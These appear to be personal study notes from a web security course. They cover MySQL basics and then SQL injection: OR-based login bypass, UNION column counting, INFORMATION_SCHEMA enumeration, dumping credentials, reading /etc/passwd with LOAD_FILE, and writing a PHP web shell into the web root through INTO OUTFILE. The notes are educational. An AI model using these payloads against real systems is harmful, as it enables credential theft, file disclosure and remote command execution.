                        ////SQL Basics

        
        -Creating a database

        mysql> CREATE DATABASE users;

        
        -view the list of databases

        mysql> SHOW DATABASES;



        -switch to a database

        mysql> USE {database};

        SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to 
        the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' 
        instead of 'USE users;'



        -example

        CREATE TABLE logins (
            id INT,
            username VARCHAR(100), //strings of 100 characters each
            password VARCHAR(100),
            date_of_joining DATETIME
            );

        
        
        
        -list of tables in the current database

        mysql> SHOW TABLES;


        
        -list the table structure with its fields and data types

        mysql> DESCRIBE {database} ;


        -Table Properties



        Within the CREATE TABLE query, there are many properties that can be set for the table 
        and each column. For example, we can set the id column to auto-increment using the 
        AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item 
        is added to the table:


        id INT NOT NULL AUTO_INCREMENT,

        The NOT NULL constraint ensures that a particular column is never left empty 'i.e., 
        required field.' We can also use the UNIQUE constraint to ensures that the inserted item 
        are always unique. For example, if we use it with the username column, we can ensure that
         no two users will have the same username:

        
        username VARCHAR(100) UNIQUE NOT NULL,


        Another important keyword is the DEFAULT keyword, which is used to specify the default 
        value. For example, within the date_of_joining column, we can set the default value to 
        Now(), which in MySQL returns the current date and time:


        date_of_joining DATETIME DEFAULT NOW(),


        Finally, one of the most important properties is PRIMARY KEY, which we can use to uniquely 
        identify each record in the table, referring to all data of a record within a table for 
        relational databases, as previously discussed in the previous section. We can make the id 
        column the PRIMARY KEY for this table:

           
           PRIMARY KEY (id)



        --example


        CREATE TABLE logins (
            id INT NOT NULL AUTO_INCREMENT,
            username VARCHAR(100) UNIQUE NOT NULL,
            password VARCHAR(100) NOT NULL,
            date_of_joining DATETIME DEFAULT NOW(),
            PRIMARY KEY (id)
            );



                ///SQL Statements


        -INSERT Statement

        INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);


        The INSERT statement is used to add new records to a given table.


        --example

        mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');




        However, we can skip filling columns with default values, such as id and date_of_joining. 
        This can be done by specifying the column names to insert values into a table selectively:

        INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);


        Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it 
        is a required value.


        We can also insert multiple records at once by separating them with a comma:

        mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');






        ---SELECT Statement

        retrieve data with the SELECT statement

        SELECT * FROM table_name;


        SELECT column1, column2 FROM table_name;


        The query above will select data present in column1 and column2 only.





        ---DROP Statement


        We can use DROP to remove tables and databases from the server.

        mysql> DROP TABLE logins;

        The 'DROP' statement will permanently and completely delete the table with no 
        confirmation, so it should be used with caution.



        
        ---ALTER Statement


        use ALTER to change the name of any table and any of its fields or to delete or add a 
        new column to an existing table


        -adds a new column newColumn to the logins table using ADD

        mysql> ALTER TABLE logins ADD newColumn INT;


        -To rename a column, we can use RENAME COLUMN

        mysql> ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;


        -We can also change a column's datatype with MODIFY

        mysql> ALTER TABLE logins MODIFY oldColumn DATE;


        -we can drop a column using DROP:

        mysql> ALTER TABLE logins DROP oldColumn;




        ///UPDATE Statement

        While ALTER is used to change a table's properties, the UPDATE statement can be used to 
        update specific records within a table, based on certain conditions

        UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;


        --example

        mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;


        Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify 
        which records get updated. 




                ///Query Results

        
        -Sorting Results

        We can sort the results of any query using ORDER BY 

        mysql> SELECT * FROM logins ORDER BY password;


        By default, the sort is done in ascending order, but we can also sort the results 
        by ASC or DESC

        mysql> SELECT * FROM logins ORDER BY password DESC;


        It is also possible to sort by multiple columns, to have a secondary sort for duplicate values 
        in one column:

        mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;




        -LIMIT results


        mysql> SELECT * FROM logins LIMIT 2;

        If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT 
        count:

        mysql> SELECT * FROM logins LIMIT 1, 2;


        Note: the offset marks the order of the first record to be included, starting from 0. For 
        the above, it starts and includes the 2nd record, and returns two values.




        --WHERE Clause


        we can use conditions with the SELECT statement using the WHERE clause, to fine-tune 
        the results:


        SELECT * FROM table_name WHERE <condition>;


        Note: String and date data types should be surrounded by single quote (') or double 
        quotes ("), while numbers can be used directly.





        --LIKE Clause


        Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. 
        The query below retrieves all records with usernames starting with admin:


        mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

        The % symbol acts as a wildcard and matches all characters after admin. It is used to match 
        zero or more characters. Similarly, the _ symbol is used to match exactly one character. 
        The below query matches all usernames with exactly three characters in them, which in this 
        case was tom:

        mysql> SELECT * FROM logins WHERE username like '___';


        


            ///SQL Operators


        -AND Operator

        condition1 AND condition2

        In MySQL terms, any non-zero value is considered true, and it usually returns the value 1 to 
        signify true. 0 is considered false. 




        -OR Operator

        mysql> SELECT 1 = 1 OR 'test' = 'abc';



        -NOT Operator

        The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':

        mysql> SELECT NOT 1 = 1;




        -Symbol Operators

        The AND, OR and NOT operators can also be represented as &&, || and !, respectively. 



        -Operators in queries

        mysql> SELECT * FROM logins WHERE username != 'john';   ///username NOT john


        mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1; 
        
        /// id greater than 1 AND username NOT equal to john




        -Multiple Operator Precedence


            Division (/), Multiplication (*), and Modulus (%)
            Addition (+) and subtraction (-)
            Comparison (=, >, <, <=, >=, !=, LIKE)
            NOT (!)
            AND (&&)
            OR (||)







                ////SQLi Discovery

        


        Before we start subverting the web application's logic and attempting to bypass the 
        authentication, we first have to test whether the login form is vulnerable to SQL injection


        Payload 	URL Encoded
        ' 	            %27
        " 	            %22
        # 	            %23
        ; 	            %3B
        ) 	            %29



        Note: In some cases, we may have to use the URL encoded version of the payload. 
        An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.


        -OR Injection

        We would need the query always to return true, regardless of the username and password 
        entered, to bypass the authentication. To do this, we can abuse the OR operator in our 
        SQL injection.




        Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an 
        empty space after them, so the comment starts with (-- ), with a space at the end. 
        This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it 
        clear, we will add another (-) at at the end (-- -), to show the use of a space character.
        The # symbol can be used as well.


        Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually 
        considered as a tag, and will not be passed as part of the URL. In order to use (#) as a 
        comment within a browser, we can use '%23', which is an URL encoded (#) symbol.




                //Union

        The Union clause is used to combine results from multiple SELECT statements. This means 
        that through a UNION injection, we will be able to SELECT and dump data from all across
        the DBMS, from multiple tables and databases.

        Note: The data types of the selected columns on all positions should be the same.

        A UNION statement can only operate on SELECT statements with an equal number of columns. 
        For example, if we attempt to UNION two queries that have results with a different number 
        of columns, we get the following error:


        ERROR 1222 (21000): The used SELECT statements have a different number of columns



        ///Un-even Columns

        We will find out that the original query will usually not have the same number of columns 
        as the SQL query we want to execute, so we will have to work around that. For example, 
        suppose we only had one column. In that case, we want to SELECT, we can put junk data for
         the remaining required columns so that the total number of columns we are UNIONing with 
         remains the same as the original query.

        For example, we can use any string as our junk data, and the query will return the string 
        as its output for that column. If we UNION with the string "junk", the SELECT query would 
        be SELECT "junk" from passwords, which will always return junk. We can also use numbers.
         For example, the query SELECT 1 from passwords will always return 1 as the output.

        
        Note: When filling other columns with junk data, we must ensure that the data type matches 
        the columns data type, otherwise the query will return an error. 


        Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 
        'NULL' fits all data types.



        ///Detect number of columns


        Using ORDER BY
        Using UNION
        


        -ORDER BY

        we can start with order by 1, sort by the first column, and succeed, as the table must have 
        at least one column. Then we will do order by 2 and then order by 3 until we reach a number 
        that returns an error, or the page does not show any output, which means that this column 
        number does not exist. The final successful column we successfully sorted by gives us the 
        total number of columns.

        If we failed at order by 4, this means the table has three columns, which is the number 
        of columns we were able to sort by successfully

        ' order by 1-- -



        -UNION


        ' UNION select 1,2,3-- -


        always gives an error until we get a success


        
        
        //Location of Injection

        While a query may return multiple columns, the web application may only display some of them. 
        So, if we inject our query in a column that is not printed on the page, we will not get its 
        output. This is why we need to determine which columns are printed to the page, to determine 
        where to place our injection





                    ///Database Enumeration


        --MySQL Fingerprinting

        As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, 
        it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. 
        The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be 
        MSSQL. However, this is a far-fetched guess.


        -mysql

        

        -SELECT @@version  ///When we have full query output


        MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'


        -SELECT POW(1,1)  ///When we only have numeric output

        1


        -SELECT SLEEP(5)  ///Blind/No Output


        
        ///INFORMATION_SCHEMA Database


        The INFORMATION_SCHEMA database contains metadata about the databases and 
        tables present on the server. 

        to reference a table present in another DB, we can use the dot ‘.’ operator. For example, 
        to SELECT a table users present in a database named my_database, we can use:

        SELECT * FROM my_database.users;



        -SCHEMATA


        The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all 
        databases on the server. It is used to obtain database names so we can then query them. 
        The SCHEMA_NAME column contains all the database names currently present.

        mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;


        We can find the current database with the SELECT database() query. We can do this similarly 
        to how we found the DBMS version in the previous section:

        ' UNION select 1,database(),2,3-- -



        -TABLES

        To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA 
        Database.

        The TABLES table contains information about all tables throughout the database. This 
        table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME 
        columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to 
        the database each table belongs to.


        ' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--


        Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' 
        database, otherwise we would get all tables in all databases, which can be many.




        -COLUMNS


        The COLUMNS table contains information about all columns present in all the databases. 
        This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, 
        and TABLE_SCHEMA columns can be used to achieve this.

        ' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS 
        where table_name='credentials'-- 



        -Data

        ' UNION select 1, username, password, 4 from dev.credentials-- -



        Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' 
        database, if we are running in a differnet database.





                    ///Reading Files

        
        -Privileges

        In MySQL, the DB user must have the FILE privilege to load a file's content into a table 
        and then dump data from that table and read files.

        /DB User

        SELECT USER()
        SELECT CURRENT_USER()
        SELECT user from mysql.user

        /User Privileges

        SELECT super_priv FROM mysql.user  ///test if we have super admin privileges


        If we had many users within the DBMS, we can add WHERE user="username" to only show privileges for 
        our current user

        The query returns Y, which means YES, indicating superuser privileges


        
        -all of the possible privileges given to our current user  

        ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 

        IF we see that the FILE privilege is listed for our user, enabling us to read files 
        and potentially even write files.




                //LOAD_FILE

        The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function 
        takes in just one argument, which is the file name. 

        SELECT LOAD_FILE('/etc/passwd');


        Note: We will only be able to read the file if the OS user running MySQL has enough privileges
        to read it.

        ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -





                        ///Writing Files

        

        To be able to write files to the back-end server using a MySQL database, we require three things:

        User with FILE privilege enabled
        MySQL global secure_file_priv variable not enabled
        Write access to the location we want to write to on the back-end server


        -secure_file_priv


        The secure_file_priv variable is used to determine where to read/write files from. An 
        empty value lets us read files from the entire file system. Otherwise, if a certain 
        directory is set, we can only read from the folder specified by the variable. On the other 
        hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to 
        empty by default, which lets us read/write to any file if the user has the FILE privilege. 
        However, MySQL uses /var/lib/mysql-files as the default folder.


        SHOW VARIABLES LIKE 'secure_file_priv';



         MySQL global variables are stored in a table called global_variables, and as per the 
         documentation, this table has two columns variable_name and variable_value.


         SELECT variable_name, variable_value FROM information_schema.global_variables 
         where variable_name="secure_file_priv"




                //SELECT INTO OUTFILE

         The SELECT INTO OUTFILE statement can be used to write data from select queries into files.

         To use it, we can add INTO OUTFILE '...' after our query to export the results into the file 
         we specified. The below example saves the output of the users table into the /tmp/credentials file:


        SELECT * from users INTO OUTFILE '/tmp/credentials';


        It is also possible to directly SELECT strings into files, allowing us to write arbitrary 
        files to the back-end server.


        SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';



        Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be 
        able to write long/advanced files, including binary data.



            /Writing Files through SQL Injection

        
        select 'file written successfully!' into outfile '/var/www/html/proof.txt'

        
        Note: To write a web shell, we must know the base web directory for the web server (
            i.e. web root). One way to find it is to use load_file to read the server configuration, 
            like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration 
            at /etc/nginx/nginx.conf, or IIS configuration at 
            %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for 
            other possible configuration locations. Furthermore, we may run a fuzzing scan and 
            try to write files to different possible web roots Finally, if none of the above works, 
            we can use server errors displayed to us and try to find the web directory that way.



        ' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

        Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This 
        is because the entire 'UNION' query result was written to the file. To make the output 
        cleaner, we can use "" instead of numbers.



                //Writing a Web Shell


        <?php system($_REQUEST[0]); ?>


        ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 


        

















